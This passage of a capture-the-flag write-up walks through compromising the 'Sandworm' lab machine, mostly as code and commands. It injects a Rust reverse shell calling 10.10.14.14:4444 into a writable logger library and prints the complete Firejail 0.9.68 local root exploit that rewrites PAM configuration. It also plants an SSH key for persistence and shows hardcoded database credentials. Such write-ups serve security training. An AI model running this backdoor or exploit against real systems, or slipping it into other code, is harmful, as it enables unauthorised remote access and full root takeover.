drwxrwxr-x 142 atlas atlas    12288 Jun  6 11:49 build
-rwxrwxr--   1 root  atlas        0 Feb  8  2023 .cargo-lock
drwxrwxr-x   2 atlas atlas    69632 Jun  6 11:49 deps
drwxrwxr-x   2 atlas atlas     4096 Jun  6 11:49 examples
drwxrwxr-- 472 root  atlas    24576 Jun  6 11:49 .fingerprint
drwxrwxr-x   6 atlas atlas     4096 Jun  6 11:49 incremental
-rwsrwxr-x   2 atlas atlas 59047248 Jun  6 10:00 tipnet
-rw-rw-r--   1 atlas atlas       87 May  4 17:24 tipnet.d

```

this executable `tipnet` is owned by "atlas" user.

The source code of this application is available 

```shell
silentobserver@sandworm:/opt/tipnet/src$ cat main.rs 
```


```rust
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("                                                     
             ,,                                      
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

");


    let mode = get_mode();
    
    if mode == "" {
	    return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

	let valid = false;
	let mut mode = String::new();

	while ! valid {
		mode.clear();

		println!("Select mode of usage:");
		print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

		io::stdin().read_line(&mut mode).unwrap();

		match mode.trim() {
			"a" => {
			      println!("\n[+] Upstream selected");
			      return "upstream".to_string();
			}
			"b" => {
			      println!("\n[+] Muscular selected");
			      return "regular".to_string();
			}
			"c" => {
			      println!("\n[+] Tempora selected");
			      return "emperor".to_string();
			}
			"d" => {
				println!("\n[+] PRISM selected");
				return "square".to_string();
			}
			"e" => {
				println!("\n[!] Refreshing indeces!");
				return "pull".to_string();
			}
			"q" | "Q" => {
				println!("\n[-] Quitting");
				return "".to_string();
			}
			_ => {
				println!("\n[!] Invalid mode: {}", mode);
			}
		}
	}
	return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```

The second folder in the /opt folder contains the library "logger" ( `extern crate logger;` ) :

```shell
silentobserver@sandworm:/opt/tipnet/src$ cat  ../../crates/logger/src/lib.rs 
```

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

We can notice the access rights of these 2 source files :

```shell
silentobserver@sandworm:/opt/tipnet/src$ ls -la ../../crates/logger/src/lib.rs main.rs 
-rw-rw-r-- 1 atlas silentobserver  732 May  4 17:12 ../../crates/logger/src/lib.rs
-rwxr-xr-- 1 root  atlas          5795 May  4 16:55 main.rs
```

We are able to modify `lib.rs` file. The software will then be recompiled, and executed.

Source : https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs

The modified source code `lib.rs` :

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

// > +
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
// < +

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }

// > +
    let sock = TcpStream::connect("10.10.14.14:4444").unwrap();

    // a tcp socket as a raw file descriptor
    // a file descriptor is the number that uniquely identifies an open file in a computer's operating system
    // When a program asks to open a file/other resource (network socket, etc.) the kernel:
    //     1. Grants access
    //     2. Creates an entry in the global file table
    //     3. Provides the software with the location of that entry (file descriptor)
    // https://www.computerhope.com/jargon/f/file-descriptor.htm
    let fd = sock.as_raw_fd();
    // so basically, writing to a tcp socket is just like writing something to a file!
    // the main difference being that there is a client over the network reading the file at the same time!

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
// < +
}
```

Now, open a listener and wait for the code to be compiled and executed :

```shell
rlwrap -cAr nc -lvnp 4444
```

And we get a shell under atlas user account.

### Privilege Escalation


We can upgrade the shell to a full TTY shell:

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```


```shell
find / -perm -u=s -type f 2>/dev/null
/opt/tipnet/target/debug/tipnet
/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
/usr/local/bin/firejail
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
```

One line is interesting :

`/usr/local/bin/firejail`

```shell
ls -la /usr/local/bin/firejail
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
```

We can get its version :

```shell
/usr/local/bin/firejail --version
firejail version 0.9.68

Compile time support:
	- always force nonewprivs support is disabled
	- AppArmor support is disabled
	- AppImage support is enabled
	- chroot support is enabled
	- D-BUS proxy support is enabled
	- file transfer support is enabled
	- firetunnel support is enabled
	- networking support is enabled
	- output logging is enabled
	- overlayfs support is disabled
	- private-home support is enabled
	- private-cache and tmpfs as user enabled
	- SELinux support is disabled
	- user namespace support is enabled
	- X11 sandboxing support is enabled
```

An exploit is available : https://www.openwall.com/lists/oss-security/2022/06/08/10

The exploit code : https://www.openwall.com/lists/oss-security/2022/06/08/10/1

The idea of the exploit (from comments in the exploit code ) :

> # Exploit: The exploit tricks the Firejail setuid-root program to join a fake
> # Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
> # user namespace of the fake Firejail instance the result will be a shell that
> # lives in an attacker controller mount namespace while the user namespace is
> # still the initial user namespace and the nonewprivs setting is unset,
> # allowing to escalate privileges via su or sudo.

This fix (https://github.com/netblue30/firejail/commit/27cde3d7d1e4e16d4190932347c7151dc2a84c50) should be in version 0.9.70

The exploit code `firejoin.py` :

```python
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner@suse.com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

Since we will need 2 terminals (1 to execute firejoin.py, and 1 to elevate privileges), the reverse shell we not be enougth. So let's get a SSH access as atlas with SSH keys (without passphrase) :

```shell
ssh-keygen -t rsa -b 4096 -f targetp0wn
```

Copy the content of "targetp0wn.pub" file into authorized_keys

```shell
cat <<EOF >/home/atlas/.ssh/authorized_keys
...
EOF
```

Then, from attacker host, open a SSH shell :

```shell
ssh -i targetp0wn atlas@ssa.htb
```

Then, execute the exploit:

```shell
nano /tmp/firejoin.py
# paste the exploit code in nano
chmod u+x /tmp/firejoin.py
# execute
python3 /tmp/firejoin.py

You can now run 'firejail --join=20888' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

In another SSH shell, we can try to follow directions :

```shell
atlas@sandworm:~$ firejail --join=20888
changing root to /proc/20888/root
Warning: cleaning all supplementary groups
Child process initialized in 6.81 ms
```

Then elevate :

```shell
atlas@sandworm:~$ sudo su -
atlas is not in the sudoers file.  This incident will be reported.
atlas@sandworm:~$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
```

atlas is not in the sudoers, so we can't sudo.
We still can activate witrh `su -` :

```shell
atlas@sandworm:~$ su -
root@sandworm:~# pwd
/root
root@sandworm:~# id
uid=0(root) gid=0(root) groups=0(root)
```
